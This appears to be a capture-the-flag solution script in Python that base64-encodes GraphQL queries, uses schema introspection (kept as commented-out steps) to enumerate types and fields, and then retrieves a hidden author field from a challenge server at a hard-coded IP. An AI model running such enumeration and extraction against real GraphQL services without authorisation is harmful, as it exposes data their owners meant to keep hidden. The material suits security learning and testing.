import base64
import requests

url='http://104.248.42.88:4446/query'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# raw_query = """
# {
#   allPosts {
#     edges {
#       node {
#         title
#         body
#       }
#     }
#   }
# }
# """
# raw_query = """
# {
#   __schema {
#     types{name}
#   }
# }
# """
# raw_query = """
# {
#   __schema {
#     types{
#       fields {
#         name
#       }
#     }
#   }
# }
# """
raw_query = """
{
  allPosts {
    edges {
      node {
        author {
          randomStr1ngtoInduc3P4in
        }
      }
    }
  }
}
"""

formatted_query = '{"query":"' + raw_query.replace('\n','\\n') + '"}'

base64_message = formatted_query.encode('ascii')
base64_bytes = base64.b64encode(base64_message)
base64query = base64_bytes.decode('ascii')

data={'query': base64query}

r = requests.post(url, headers=headers, data=data)

print(r.text)
